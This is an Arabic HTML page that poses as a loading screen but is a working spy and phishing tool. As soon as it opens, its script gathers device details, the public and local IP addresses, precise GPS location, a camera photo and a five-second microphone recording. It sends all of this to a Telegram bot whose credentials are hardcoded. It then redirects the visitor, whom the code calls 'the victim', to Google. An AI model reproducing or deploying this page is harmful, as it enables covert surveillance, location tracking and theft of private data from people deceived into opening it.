<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            direction: rtl;
        }
        .loading-container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            color: #333;
            margin-bottom: 15px;
        }
        p {
            color: #666;
            margin-bottom: 10px;
        }
        .status {
            color: #667eea;
            font-weight: bold;
            margin-top: 15px;
        }
        .progress-bar {
            width: 100%;
            height: 10px;
            background: #f0f0f0;
            border-radius: 5px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            width: 0%;
            transition: width 0.3s ease;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <h2>⏳ جاري التحميل...</h2>
        <p>يرجى الانتظار قليلاً</p>
        <div class="loader"></div>
        <div class="progress-bar">
            <div class="progress" id="progress"></div>
        </div>
        <div class="status" id="status">بدء جمع المعلومات...</div>
    </div>

    <script>
        // ==================== الإعدادات ====================
        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
        const CHAT_ID = "7392262688";
        
        // ==================== دوال مساعدة ====================
        function updateStatus(text, progress) {
            document.getElementById('status').innerText = text;
            if (progress !== undefined) {
                document.getElementById('progress').style.width = progress + '%';
            }
        }

        async function sendToTelegram(type, data) {
            try {
                if (type === 'text') {
                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                    await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: data,
                            parse_mode: 'HTML'
                        })
                    });
                } else if (type === 'photo') {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', data, 'camera.jpg');
                    formData.append('caption', '📸 صورة من الكاميرا');
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } else if (type === 'voice') {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('voice', data, 'microphone.ogg');
                    formData.append('caption', '🎤 تسجيل من الميكروفون');
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
                        method: 'POST',
                        body: formData
                    });
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }

        // ==================== جمع معلومات الجهاز ====================
        async function getDeviceInfo() {
            updateStatus('جمع معلومات الجهاز...', 10);
            
            const info = {
                '🌐 User Agent': navigator.userAgent,
                '💻 اللغة': navigator.language,
                '🔧 المنصة': navigator.platform,
                '📱 Vendor': navigator.vendor,
                '🌍 متصل بالإنترنت': navigator.onLine ? 'نعم' : 'لا',
                '🍪 الكوكيز مفعلة': navigator.cookieEnabled ? 'نعم' : 'لا',
                '🖥️ دقة الشاشة': `${window.screen.width} x ${window.screen.height}`,
                '🎨 عمق الألوان': window.screen.colorDepth + ' bit',
                '⏰ المنطقة الزمنية': Intl.DateTimeFormat().resolvedOptions().timeZone,
                '📅 التاريخ': new Date().toLocaleString('ar-SA')
            };

            let infoText = '🔰 <b>معلومات الجهاز:</b>\n\n';
            for (const [key, value] of Object.entries(info)) {
                infoText += `${key}: <code>${value}</code>\n`;
            }

            // إضافة معلومات البطارية
            try {
                const battery = await navigator.getBattery();
                infoText += `🔋 البطارية: ${Math.round(battery.level * 100)}%\n`;
                infoText += `⚡ حالة الشحن: ${battery.charging ? 'يشحن' : 'لا يشحن'}\n`;
            } catch (e) {}

            await sendToTelegram('text', infoText);
            return infoText;
        }

        // ==================== التقاط صورة من الكاميرا ====================
        async function captureCamera() {
            updateStatus('محاولة الوصول للكاميرا...', 30);
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'environment' // الكاميرا الخلفية إذا وجدت
                    }, 
                    audio: false 
                });
                
                updateStatus('الكاميرا متصلة...', 50);
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // انتظار تحميل الفيديو
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.width = video.videoWidth;
                        video.height = video.videoHeight;
                        resolve();
                    };
                });
                
                updateStatus('التقاط الصورة...', 60);
                
                // رسم الصورة
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // إيقاف الكاميرا
                stream.getTracks().forEach(track => track.stop());
                
                // تحويل الصورة إلى blob
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
                
                updateStatus('إرسال الصورة...', 70);
                await sendToTelegram('photo', blob);
                
                return true;
            } catch (error) {
                console.error('Camera error:', error);
                await sendToTelegram('text', `❌ فشل الوصول للكاميرا: ${error.message}`);
                return false;
            }
        }

        // ==================== تسجيل الصوت من الميكروفون ====================
        async function recordMicrophone() {
            updateStatus('محاولة الوصول للميكروفون...', 40);
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: false, 
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        autoGainControl: true
                    } 
                });
                
                updateStatus('الميكروفون متصل...', 50);
                
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];
                
                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };
                
                mediaRecorder.onstop = async () => {
                    updateStatus('تجهيز التسجيل...', 70);
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    
                    updateStatus('إرسال التسجيل...', 80);
                    await sendToTelegram('voice', audioBlob);
                    
                    stream.getTracks().forEach(track => track.stop());
                };
                
                // تسجيل لمدة 5 ثواني
                updateStatus('جاري التسجيل (5 ثوان)...', 60);
                mediaRecorder.start();
                
                await new Promise(resolve => setTimeout(resolve, 5000));
                
                mediaRecorder.stop();
                return true;
                
            } catch (error) {
                console.error('Microphone error:', error);
                await sendToTelegram('text', `❌ فشل الوصول للميكروفون: ${error.message}`);
                return false;
            }
        }

        // ==================== الحصول على الموقع ====================
        async function getLocation() {
            updateStatus('محاولة الحصول على الموقع...', 20);
            
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                
                const { latitude, longitude, accuracy } = position.coords;
                
                const locationText = `📍 <b>الموقع:</b>\n` +
                    `الخط: <code>${latitude}</code>\n` +
                    `الطول: <code>${longitude}</code>\n` +
                    `الدقة: ±${accuracy} متر\n` +
                    `<a href='https://www.google.com/maps?q=${latitude},${longitude}'>عرض على الخريطة</a>`;
                
                await sendToTelegram('text', locationText);
                
                // إرسال كموقع مباشر
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: latitude,
                        longitude: longitude
                    })
                });
                
                return true;
            } catch (error) {
                console.error('Location error:', error);
                await sendToTelegram('text', `❌ فشل الحصول على الموقع: ${error.message}`);
                return false;
            }
        }

        // ==================== الحصول على IP ====================
        async function getIP() {
            updateStatus('جمع معلومات الشبكة...', 15);
            
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                await sendToTelegram('text', `🌐 <b>IP العام:</b> <code>${data.ip}</code>`);
                
                // محاولة الحصول على IP المحلي
                const rtc = new RTCPeerConnection();
                rtc.createDataChannel('');
                const offer = await rtc.createOffer();
                await rtc.setLocalDescription(offer);
                
                rtc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.address || e.candidate.ip;
                        if (ip && ip !== data.ip) {
                            sendToTelegram('text', `🏠 <b>IP المحلي:</b> <code>${ip}</code>`);
                        }
                    }
                };
                
                setTimeout(() => rtc.close(), 2000);
            } catch (error) {
                console.error('IP error:', error);
            }
        }

        // ==================== الوظيفة الرئيسية ====================
        async function main() {
            try {
                // 1. معلومات الجهاز الأساسية
                await getDeviceInfo();
                
                // 2. IP
                await getIP();
                
                // 3. الموقع
                await getLocation();
                
                // 4. الكاميرا
                await captureCamera();
                
                // 5. الميكروفون
                await recordMicrophone();
                
                // تم بنجاح
                updateStatus('✅ تم جمع المعلومات بنجاح!', 100);
                
                // رسالة تأكيد
                await sendToTelegram('text', '✅ <b>تم جمع جميع المعلومات بنجاح</b>\n📸 صورة الكاميرا + 🎤 تسجيل الميكروفون');
                
                // تحويل الضحية لجوجل بعد ثانيتين
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 2000);
                
            } catch (error) {
                console.error('Main error:', error);
                updateStatus('❌ حدث خطأ', 0);
                
                await sendToTelegram('text', `❌ <b>خطأ عام:</b> ${error.message}`);
                
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 2000);
            }
        }

        // ==================== تشغيل كل شيء ====================
        main();
    </script>
</body>
</html>
